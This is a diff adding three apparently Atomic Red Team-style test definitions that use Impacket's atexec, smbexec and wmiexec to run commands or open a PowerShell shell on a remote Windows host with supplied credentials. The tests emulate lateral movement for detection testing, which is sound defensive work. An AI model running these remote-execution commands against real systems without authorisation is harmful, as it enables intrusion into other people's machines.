@@ -1,0 +1,140 @@
+attack_technique: T1053.002
+display_name: "Scheduled Task/Job: At"
+atomic_tests:
+- name: Impacket atexec
+  auto_generated_guid: 9e5c0669-fe26-4a7c-a664-7c10109fc208
+  description: |
+    Launches Impacket atexec module.
+
+    This test requires python to be installed
+  supported_platforms:
+  - windows
+  input_arguments:
+    path_to_impacket:
+      description: Path to impacket installation (if None it will use impacket location after pip install)
+      type: path
+      default: None
+    target_ip:
+      description: IP of target machine
+      type: string
+      default: 192.168.100.100
+    target_username:
+      description: Username to use for authentication on target machine
+      type: string
+      default: test
+    target_password:
+      description: Password to use for authentication on target machine
+      type: string
+      default: test
+  dependency_executor_name: powershell
+  dependencies:
+    - description: Test if script exists
+      prereq_command: |
+        if ("#{path_to_impacket}" -eq "None"){if(pip freeze | Select-String impacket) {exit 0} else {exit 1}} 
+        else {if(dir "#{path_to_impacket}"|Select-String impacket) {exit 0} else {exit 1}}
+      get_prereq_command: |
+        if ("#{path_to_impacket}" -eq "None"){pip install impacket}
+        else{Invoke-WebRequest "https://github.com/fortra/impacket/archive/refs/tags/impacket_0_11_0.zip" -OutFile "#{path_to_impacket}\impacket.zip";
+        Expand-Archive -Path #{path_to_impacket}\impacket.zip -DestinationPath #{path_to_impacket}\impacket
+        pip install -r #{path_to_impacket}\impacket\impacket-impacket_0_11_0\requirements.txt
+        pip install setuptools}
+  executor:
+    command: |
+      if ("#{path_to_impacket}" -eq "None"){$path = "C:\Users\$Env:Username\AppData\Local\Programs\Python\Python312\Lib\site-packages\impacket\examples"} else {$path = "#{path_to_impacket}\impacket\impacket-impacket_0_11_0\examples"};
+      cd $path;
+      python.exe atexec.py #{target_username}:#{target_password}@#{target_ip} whoami
+    name: powershell
+---
+attack_technique: T1569.002
+display_name: "System Services: Service Execution"
+atomic_tests:
+- name: Impacket smbexec
+  auto_generated_guid: 06d6b681-198a-4b78-a5ad-1603f380ef7a
+  description: |
+    Launches Impacket smbexec module.
+
+    This test requires python version between 3.7 and 3.10 (inclusive) to be installed
+  supported_platforms:
+  - windows
+  input_arguments:
+    path_to_impacket:
+      description: Path to impacket installation (if None it will use impacket location after pip install)
+      type: path
+      default: None
+    target_ip:
+      description: IP of target machine
+      type: string
+      default: 192.168.100.100
+    target_username:
+      description: Username to use for authentication on target machine
+      type: string
+      default: test
+    target_password:
+      description: Password to use for authentication on target machine
+      type: string
+      default: test
+  dependency_executor_name: powershell
+  dependencies:
+    - description: Test if script exists
+      prereq_command: |
+        if ("#{path_to_impacket}" -eq "None"){if(pip freeze | Select-String impacket) {exit 0} else {exit 1}} 
+        else {if(dir "#{path_to_impacket}"|Select-String impacket) {exit 0} else {exit 1}}
+      get_prereq_command: |
+        if ("#{path_to_impacket}" -eq "None"){pip install impacket}
+        else{Invoke-WebRequest "https://github.com/fortra/impacket/archive/refs/tags/impacket_0_11_0.zip" -OutFile "#{path_to_impacket}\impacket.zip";
+        Expand-Archive -Path #{path_to_impacket}\impacket.zip -DestinationPath #{path_to_impacket}\impacket
+        pip install -r #{path_to_impacket}\impacket\impacket-impacket_0_11_0\requirements.txt
+        pip install setuptools}
+  executor:
+    command: |
+      if ("#{path_to_impacket}" -eq "None"){$path = "C:\Users\$Env:Username\AppData\Local\Programs\Python\Python312\Lib\site-packages\impacket\examples"} else {$path = "#{path_to_impacket}\impacket\impacket-impacket_0_11_0\examples"};
+      cd $path;
+      python.exe smbexec.py #{target_username}:#{target_password}@#{target_ip} -shell-type powershell
+    name: powershell
+---
+attack_technique: T1047
+display_name: Windows Management Instrumentation
+atomic_tests:
+- name: Impacket wmiexec
+  auto_generated_guid: 528ca132-c851-4722-9630-27284d980502
+  description: |
+    Launches Impacket wmiexec module.
+
+    This test requires python version between 3.7 and 3.10 (inclusive) to be installed
+  supported_platforms:
+  - windows
+  input_arguments:
+    path_to_impacket:
+      description: Path to impacket installation (if None it will use impacket location after pip install)
+      type: path
+      default: None
+    target_ip:
+      description: IP of target machine
+      type: string
+      default: 192.168.100.100
+    target_username:
+      description: Username to use for authentication on target machine
+      type: string
+      default: test
+    target_password:
+      description: Password to use for authentication on target machine
+      type: string
+      default: test
+  dependency_executor_name: powershell
+  dependencies:
+    - description: Test if script exists
+      prereq_command: |
+        if ("#{path_to_impacket}" -eq "None"){if(pip freeze | Select-String impacket) {exit 0} else {exit 1}} 
+        else {if(dir "#{path_to_impacket}"|Select-String impacket) {exit 0} else {exit 1}}
+      get_prereq_command: |
+        if ("#{path_to_impacket}" -eq "None"){pip install impacket}
+        else{Invoke-WebRequest "https://github.com/fortra/impacket/archive/refs/tags/impacket_0_11_0.zip" -OutFile "#{path_to_impacket}\impacket.zip";
+        Expand-Archive -Path #{path_to_impacket}\impacket.zip -DestinationPath #{path_to_impacket}\impacket
+        pip install -r #{path_to_impacket}\impacket\impacket-impacket_0_11_0\requirements.txt
+        pip install setuptools}
+  executor:
+    command: |
+      if ("#{path_to_impacket}" -eq "None"){$path = "C:\Users\$Env:Username\AppData\Local\Programs\Python\Python312\Lib\site-packages\impacket\examples"} else {$path = "#{path_to_impacket}\impacket\impacket-impacket_0_11_0\examples"};
+      cd $path;
+      python.exe wmiexec.py #{target_username}:#{target_password}@#{target_ip} -shell-type powershell
+    name: powershell
